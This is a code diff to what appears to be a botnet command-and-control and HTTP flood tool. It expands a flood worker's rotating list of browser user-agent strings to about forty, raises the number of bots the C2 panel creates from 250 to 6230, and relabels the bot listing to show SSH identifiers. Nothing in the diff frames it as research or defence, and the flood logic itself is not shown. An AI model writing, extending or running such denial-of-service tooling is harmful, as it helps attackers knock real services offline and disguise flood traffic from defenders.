@@ -458,7 +458,49 @@ class Engine:
                 with self.lock: self.errors+=1
                     
     def _http_methods_worker(self, ip, port, method="HTTP_POST"):
-        uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120","Mozilla/5.0 (Macintosh) Chrome/120"]
+        uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120","Mozilla/5.0 (Macintosh) Chrome/120","Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+"Mozilla/5.0 (CrOS x86_64 16000.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0",
+"Mozilla/5.0 (Windows NT 11.0; rv:122.0) Gecko/20100101 Firefox/122.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1; rv:121.0) Gecko/20100101 Firefox/121.0",
+"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/128.0.2739.79",
+"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.2704.88",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.0.0 Mobile/15E148 Safari/604.1",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/117.0 Mobile/15E148 Safari/605.1.15",
+"Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+"Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 13; SM-S911U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/118.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 12; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/117.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro; rv:118.0) Gecko/118.0 Firefox/118.0",
+"Mozilla/5.0 (Linux; Android 12; Pixel 5a; rv:117.0) Gecko/117.0 Firefox/117.0",
+"Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 12; POCO F4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 13; Xiaomi 12T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Linux; Android 12; vivo V27) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; rv:118.0) Gecko/20100101 Firefox/118.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1; rv:117.0) Gecko/20100101 Firefox/117.0",
+"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.2592.68",
+"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.2486.72",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
+]
         methods = {"HTTP_POST":"POST","HTTP_PUT":"PUT","HTTP_DELETE":"DELETE","HTTP_PATCH":"PATCH","HTTP_OPTIONS":"OPTIONS","HTTP_HEAD":"HEAD"}
         http_method = methods.get(method, "GET")
         
@@ -638,7 +680,7 @@ class C2:
         self.max_threads = 1
         self.c2_status = "ONLINE"
         self.plan = "FREE"
-        self.add_bots(250)
+        self.add_bots(6230)
         
         
         self.attack_history = []
@@ -708,7 +750,7 @@ class C2:
     def show_bots(self):
         self.banner()
         print(f"\n  {T.get('a')}Active Bots: {len(self.bots)}{R}\n")
-        print("  {:<6s} {:<18s} {:<15s} {}".format("ID","IP","Hostname","Status"))
+        print("  {:<6s} {:<18s} {:<15s} {}".format("ID","IP","SSH-ID","Status"))
         print("  "+"-"*50)
         for bid, bot in list(self.bots.items())[:40]:
             sc = T.get('s') if bot["status"]=="online" else R
